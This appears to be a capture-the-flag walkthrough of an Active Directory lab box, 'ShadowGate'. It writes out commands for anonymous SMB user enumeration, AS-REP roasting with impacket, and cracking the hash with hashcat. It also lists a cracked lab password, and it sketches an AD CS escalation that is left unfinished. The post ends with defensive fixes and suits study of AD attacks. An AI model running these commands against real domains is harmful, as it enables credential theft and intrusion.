---
title: "ShadowGate — Active Directory Walkthrough: Null Session to AS-REP Roast to AD CS"
description: "Active Directory walkthrough of ShadowGate (Windows Server 2022) — anonymous SMB user enumeration, AS-REP roasting a pre-auth-disabled account, and pivoting toward AD CS abuse."
date: 2026-07-05 13:00:00 +0000
categories: [Active Directory]
tags: [active-directory, as-rep-roasting, ad-cs, kerberos, smb, oscp]
difficulty: Medium
---

> **Box:** Active Directory (Hack Smarter / OSCP-style) · **OS:** Windows Server 2022 · **Domain:** shadow.gate · **Theme:** Null-session enum → AS-REP roasting → AD CS

ShadowGate is a proper Active Directory box — no web app, just a domain controller and the classic AD kill chain. I got a foothold the way you so often do against a misconfigured DC: an anonymous SMB session gave me the user list, one of those users was AS-REP roastable, and their password fell to rockyou in seconds. From there the trail points straight at Active Directory Certificate Services.

## Recon

```bash
rustscan -a 10.0.21.211 -- -A
```

The port spread screamed **domain controller**: DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), kpasswd (464), WinRM (5985), ADWS (9389), plus RDP and IIS. The LDAP certificate handed me the naming: domain **shadow.gate**, DC **DC01.shadow.gate**. First move — add both to `/etc/hosts`.

## SMB Enumeration — anonymous access

Signing was off, so I tried a null session and it worked:

```bash
nxc smb 10.0.21.211 -u "" -p ""
# [+] shadow.gate\:  (Windows Server 2022 Build 20348, signing:False)
```

That blank session was enough to pull the full domain user list:

```bash
nxc smb 10.0.21.211 -u "" -p "" --users
```

Twelve users came back. I dropped the human ones into `users.txt`:

```text
Administrator  Guest  krbtgt  ATHENA  mbrownlee  bbrown
jtrueblood  jsmith  clocke  tclarke  jbradford  amoss
```

## AS-REP Roasting

With a user list and no credentials, AS-REP roasting is the obvious next play — it targets accounts that don't require Kerberos pre-authentication:

```bash
impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip DC01.shadow.gate 'shadow.gate/'
```

Only one account had pre-auth disabled — **jtrueblood** — and it returned a `$krb5asrep$` hash. Straight into hashcat with mode 18200:

```bash
hashcat -a 0 -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt
```

It cracked almost instantly:

```text
jtrueblood : blood_brothers
```

## Foothold — authenticated enumeration

Valid domain creds in hand, I checked share access:

```bash
nxc smb 10.0.21.211 -u "jtrueblood" -p "blood_brothers" --shares
```

Alongside the usual NETLOGON / SYSVOL, one share stood out — **CertEnroll**, the Active Directory Certificate Services share. That's a strong signal AD CS is in play. I pulled everything from it:

```bash
smbclient //10.0.21.211/CertEnroll -U "jtrueblood"
smb: \> mget *
# DC01.shadow.gate_shadow-DC01-CA.crt, nsrev_shadow-DC01-CA.asp, *.crl
```

The CA (`shadow-DC01-CA`) is now confirmed on the box.

## Privilege Escalation — AD CS

*(This run's notes stop at the CertEnroll loot.)* With a valid domain user and a live enterprise CA, the natural next step is to enumerate the certificate templates for an ESC misconfiguration — running `certipy find` as jtrueblood to look for a vulnerable template, then abusing it to escalate toward Domain Admin. I'll complete this section once I've captured the certificate-abuse path.

## Takeaways

- **Anonymous SMB is a gift.** A null session that leaks the full user list turns "no creds" into "a target list for roasting."
- **AS-REP roasting needs nothing but a username.** Any account with pre-auth disabled is crackable offline — and weak passwords like `blood_brothers` don't survive rockyou.
- **CertEnroll = AD CS = look for ESC.** An exposed enterprise CA is one of the most reliable escalation paths in modern AD.
- **Defensive fixes:** disable anonymous SMB and enable signing, require Kerberos pre-auth on every account, enforce strong passwords, and audit certificate templates for insecure enrollment settings.
